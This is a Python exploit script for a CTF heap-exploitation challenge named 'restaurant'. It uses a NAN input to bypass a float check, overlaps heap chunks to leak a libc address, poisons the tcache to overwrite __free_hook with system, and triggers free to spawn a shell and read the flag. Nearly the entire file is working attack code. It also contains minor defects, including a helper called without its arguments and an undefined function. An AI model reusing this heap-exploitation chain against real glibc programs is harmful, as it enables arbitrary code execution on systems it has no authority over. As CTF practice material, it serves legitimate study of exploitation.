# File: exp.py
# Author: raycp
# Date: 2019-06-12
# Description: exp for restaurant, NAN to bypass double float check.

from pwn_debug import *


pdbg=""
p=''
membp=""
elf=""
libc=""

#io_file=IO_FILE_plus()
#io_file.show()

def order(idx,count,tips):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("want: ")
    p.sendline(str(idx))
    p.recvuntil("want: ")
    p.sendline(str(count))
    p.recvuntil("tips: ")
    p.send(tips)

def leave_name(size,name):
    p.recvuntil(":(y/n) ")
    p.sendline("y")
    p.recvuntil("name: ")
    p.sendline(str(size))
    p.recvuntil("name: ")
    p.send(name)

def reset_name():
    p.recvuntil(":(y/n) ")
    p.sendline("y")
    p.recvuntil("name: ")
    p.sendline(str(0x300))


def check():
    p.recvuntil("choice:")
    p.sendline("2")


def pay(size,name):
    p.recvuntil("choice:")
    p.sendline("3")
    leave_name()


def request():
    p.recvuntil("choice:")
    p.sendline("4")


def dislike():
    p.recvuntil("choice:")
    p.sendline("5")



def pwn(remote):
    
    #pdbg.bp(0xefe)
    ## step 1 malloc out playground, which will form a largebin later
    for i in range(0,3):
        order(1,1,"NAN")
        leave_name(0x1b0+i*0x10,'a')
    order(1,1,"NAN")
    leave_name(0x1e0,'a'*0x60+p64(0x421)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
   
    # step 2 clean the name ptr
    order(1,1,"NAN")
    reset_name()

    # step 3 malloc out the first bin
    order(1,1,"NAN")
    leave_name(0x1b0,'a')
    #pdbg.bp([0xefe,0xfa2,0xca4])

    #step 4 key!! overwrite the size, which can form heap overwrite vuln and change the header of next chunk from 0x1d0 to 0x420
    order(1,1,"0.55\n")
    leave_name(0x100,'a'*0x1b0+p64(0)+p64(0x421)) 

    order(1,1,"NAN")
    reset_name()

    #pdbg.bp([0xc64,0xc1e])
    # step 5 malloc out the overwrited chunk
    order(1,1,"NAN")
    leave_name(0x1c0,'\xa0')

    # step 6 free the largebin to unsorted bin
    order(1,1,"NAN")
    reset_name()
    #pdbg.bp(0xcf9) 

    # step 7 malloc the heap with 0x200 size will form a overlap chunk and leak libc address
    order(1,1,"NAN")
    leave_name(0x200,'\x90')
    p.recvuntil("ure : ")
    leak_libc=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    libc_base=leak_libc-0x3ec090
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info("leak libc_base: 0x%x"%(libc_base))
    
    # step 8 overwrite the next chunk size and change the tcache chain point to __free_hook-8
    order(1,1,"NAN")
    payload='/bin/sh\x00'
    payload=confused_pack(payload,0x1c0)
    payload=payload+p64(0)+p64(0x211)+p64(free_hook-8)+p64(0)
    leave_name(0x200,payload)
    
    order(1,1,"NAN")
    reset_name()
    
    # step 9 malloc out the first chunk and free it into anathor chain
    order(1,1,"NAN")
    leave_name(0x1d0,'a')

    order(1,1,"NAN")
    reset_name()

    #pdbg.bp([0xc64,0xc1e])
    # step 10 malloc free_hook-8 and put '\bin\sh\x00' and system into it.
    order(1,1,"NAN")
    leave_name(0x1d0,'/bin/sh\x00'+p64(system_addr))

    # step 11 trigger free to get shell.
    order(1,1,"NAN")
    reset_name()

    if remote:
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        return flag
    else:
        p.interactive()
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        return flag
        p.interactive() 
        flag=None

    return flag

def run_exp(ip,port,remote):
    global pdbg
    global p
    global membp
    global elf
    global libc
    pdbg=pwn_debug("./restaurant")

    pdbg.context.terminal=['tmux', 'splitw', '-h']

    pdbg.local()
    pdbg.debug("2.27")
    pdbg.remote(ip, port)
    
    
    if not remote:
        #p=pdbg.run("debug")
        p=pdbg.run("local")
        membp=pdbg.membp
    else:
        p=pdbg.run("remote")
    elf=pdbg.elf
    libc=pdbg.libc
    
    flag=pwn(remote)
   
    return flag

if __name__ == '__main__':
    #pwn()
    run_exp("0",0,0)


